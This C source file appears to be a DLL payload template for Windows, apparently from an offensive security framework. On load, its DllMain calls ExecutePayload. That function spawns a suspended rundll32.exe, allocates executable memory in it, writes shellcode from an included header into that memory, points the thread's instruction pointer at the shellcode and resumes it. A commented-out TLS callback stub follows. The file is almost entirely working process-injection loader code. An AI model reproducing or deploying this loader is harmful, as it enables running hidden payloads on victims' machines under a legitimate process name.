#include <windows.h>
#include "template.h"

/* hand-rolled bzero allows us to avoid including ms vc runtime */
void inline_bzero(void *p, size_t l)
{
   
           BYTE *q = (BYTE *)p;
           size_t x = 0;
           for (x = 0; x < l; x++)
                     *(q++) = 0x00;
}

void ExecutePayload(void);

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
			ExecutePayload();
            break;

        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

        case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    }
    return TRUE;
}

void ExecutePayload(void) {
    int error;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	CONTEXT ctx;
	DWORD prot;
   LPVOID ep;

	// Start up the payload in a new process
	inline_bzero( &si, sizeof( si ));
	si.cb = sizeof(si);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if(CreateProcess( 0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
		GetThreadContext(pi.hThread, &ctx);

	   ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);

#ifdef _WIN64
	   ctx.Rip = (DWORD64)ep;
#else
	   ctx.Eip = (DWORD)ep;
#endif

        SetThreadContext(pi.hThread,&ctx);

        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
	}
   // ExitProcess(0);
   ExitThread(0);
}

/*
typedef VOID
(NTAPI *PIMAGE_TLS_CALLBACK) (
    PVOID DllHandle,
    ULONG Reason,
    PVOID Reserved
    );

VOID NTAPI TlsCallback(
      IN PVOID DllHandle,
      IN ULONG Reason,
      IN PVOID Reserved)
{
	__asm  ( "int3" );
}

ULONG _tls_index;
PIMAGE_TLS_CALLBACK _tls_cb[] = { TlsCallback, NULL };
IMAGE_TLS_DIRECTORY _tls_used = { 0, 0, (ULONG)&_tls_index, (ULONG)_tls_cb, 1000, 0 };
*/

